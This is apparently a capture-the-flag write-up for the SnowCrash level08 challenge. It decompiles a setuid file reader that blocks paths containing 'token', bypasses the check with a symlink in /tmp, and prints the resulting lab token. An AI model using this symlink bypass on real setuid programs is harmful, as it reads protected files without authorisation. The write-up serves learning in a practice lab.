# Level08

Pretty straightforward... looking into the disassembler you will see the following:

```
0804856a        char** envp_1 = envp
0804856e        void* gsbase
0804856e        int32_t eax_2 = *(gsbase + 0x14)
0804856e        
08048581        if (argc == 1)
08048595            printf("%s [file to read]\n", *argv)
080485a1            exit(1)
080485a1        
080485c1        if (strstr(argv[1], "token") != 0)
080485d8            printf("You may not access '%s'\n", argv[1])
080485e4            exit(1)
080485e4        
080485fd        int32_t eax_14 = open(argv[1], 0)
080485fd        
0804860b        if (eax_14 == 0xffffffff)
08048629            err(1, "Unable to open %s", argv[1])
08048629        
08048645        void var_414
08048645        int32_t eax_19 = read(eax_14, &var_414, 0x400)
08048645        
08048653        if (eax_19 == 0xffffffff)
0804866c            err(1, "Unable to read fd %d", eax_14)
0804866c        
08048688        int32_t result = write(1, &var_414, eax_19)
08048688        
0804869b        if (eax_2 == *(gsbase + 0x14))
080486a3            return result
080486a3        
0804869d        return __stack_chk_fail()
```

Looking into the ls -l we will see a token, but when using it...

```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token

level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

To get access, we need to make a softlink in tmp to mitigate the read permissions.

```
level08@SnowCrash:~$ ln -sf /home/user/level08/token /tmp/tok
level08@SnowCrash:~$ ./level08 /tmp/tok
quif5eloekouj29ke0vouxean
```
